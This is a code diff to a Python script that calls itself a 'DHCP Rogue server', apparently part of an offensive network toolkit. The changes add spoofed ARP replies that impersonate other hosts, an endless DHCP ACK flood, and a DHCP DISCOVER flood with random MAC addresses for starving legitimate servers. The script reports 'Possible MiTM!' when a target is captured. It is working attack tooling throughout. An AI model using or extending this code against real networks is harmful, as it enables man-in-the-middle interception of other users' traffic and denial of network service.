@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 from base import Base
-from network import Ethernet_raw, DHCP_raw
+from network import Ethernet_raw, ARP_raw, DHCP_raw
 from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv4Address
@@ -11,12 +11,13 @@ from base64 import b64encode
 from struct import pack
 from netaddr import IPAddress
 from tm import ThreadManager
+from time import sleep
 
 Base = Base()
 Base.check_user()
 Base.check_platform()
 
-tm = ThreadManager(2)
+tm = ThreadManager(3)
 
 parser = ArgumentParser(description='DHCP Rogue server')
 
@@ -67,6 +68,7 @@ if not args.quiet:
     Base.print_banner()
 
 eth = Ethernet_raw()
+arp = ARP_raw()
 dhcp = DHCP_raw()
 
 current_network_interface = None
@@ -90,6 +92,7 @@ payload = None
 arp_req_router = False
 arp_req_your_ip = False
 possible_output = False
+is_new_connection = False
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -234,9 +237,18 @@ def ack_sender():
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
     ack_packet = make_dhcp_ack_packet(transaction_id_global, requested_ip_address)
-    for _ in range(10000000):
+    while True:
         SOCK.send(ack_packet)
-    SOCK.close()
+        sleep(0.01)
+
+
+def discover_sender():
+    SOCK = socket(AF_PACKET, SOCK_RAW)
+    SOCK.bind((current_network_interface, 0))
+    while True:
+        discover_packet = dhcp.make_discover_packet(source_mac=your_mac_address, client_mac=eth.get_random_mac())
+        SOCK.send(discover_packet)
+        sleep(0.01)
 
 
 def dhcp_reply(request):
@@ -255,6 +267,7 @@ def dhcp_reply(request):
     global possible_output
     global router_ip_address
     global tm
+    global is_new_connection
 
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
@@ -268,20 +281,8 @@ def dhcp_reply(request):
         target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
 
         if request[DHCP].options[0][1] == 1:
-            if target_ip_address is not None:
-                offer_ip_address = target_ip_address
-            else:
-                next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
-                if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
-                    number_of_dhcp_request += 1
-                    offer_ip_address = str(next_offer_ip_address)
-                else:
-                    number_of_dhcp_request = 0
-                    offer_ip_address = args.first_offer_ip
-
-            print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + \
-                hex(transaction_id) + " offer ip: " + offer_ip_address
-
+            is_new_connection = True
+            print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id)
             if args.new:
                 if target_ip_address is not None:
                     requested_ip = target_ip_address
@@ -295,10 +296,21 @@ def dhcp_reply(request):
                 requested_ip_address = requested_ip
 
                 tm.add_task(ack_sender)
+
+            if target_ip_address is not None:
+                offer_ip_address = target_ip_address
             else:
-                offer_packet = make_dhcp_offer_packet(transaction_id)
-                SOCK.send(offer_packet)
-                print Base.c_info + "Send offer response!"
+                next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
+                if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
+                        number_of_dhcp_request += 1
+                        offer_ip_address = str(next_offer_ip_address)
+                else:
+                        number_of_dhcp_request = 0
+                        offer_ip_address = args.first_offer_ip
+
+            offer_packet = make_dhcp_offer_packet(transaction_id)
+            SOCK.send(offer_packet)
+            print Base.c_info + "Send offer response!"
 
         if request[DHCP].options[0][1] == 8:
             ciaddr = request[BOOTP].ciaddr
@@ -432,17 +444,23 @@ def dhcp_reply(request):
                         SOCK.send(ack_packet)
                         print Base.c_info + "Send ack response!"
 
+        if request[DHCP].options[0][1] == 4:
+            is_new_connection = True
+            print Base.c_info + "DHCP DECLINE from: " + target_mac_address + " transaction id: " + hex(transaction_id)
+            tm.add_task(discover_sender)
+
     if request.haslayer(ARP):
         if target_ip_address is not None:
             if request[ARP].op == 1:
                 if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                     print Base.c_info + "ARP request src MAC: " + request[ARP].hwsrc + " dst IP: " + request[ARP].pdst
-                    if request[ARP].pdst != target_ip_address:
+                    if request[ARP].pdst != target_ip_address or not is_new_connection:
                         if not args.apple:
-                            sendp(Ether(dst=request[ARP].hwsrc, src=your_mac_address)
-                                  / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
-                                        hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2),
-                                  iface=current_network_interface, verbose=False)
+                            arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
+                                                          ethernet_dst_mac=request[ARP].hwsrc,
+                                                          sender_mac=your_mac_address, sender_ip=request[ARP].pdst,
+                                                          target_mac=request[ARP].hwsrc, target_ip=request[ARP].psrc)
+                            SOCK.send(arp_reply)
                             print Base.c_info + "Send ARP response!"
                     else:
                         arp_req_your_ip = True
@@ -450,7 +468,7 @@ def dhcp_reply(request):
                     arp_req_router = True
 
                 if arp_req_router or arp_req_your_ip:
-                    if not possible_output and not args.apple and not args.cisco:
+                    if not possible_output and not args.apple and not args.cisco and not args.new:
                         try:
                             print Base.c_warning + "Possible MiTM! Target: " + Base.cWARNING + \
                                   target_ip_address + " (" + target_mac_address + ")" + Base.cEND
@@ -464,6 +482,7 @@ def dhcp_reply(request):
                         if not args.not_exit:
                             SOCK.close()
                             exit(0)
+
     SOCK.close()
 
 
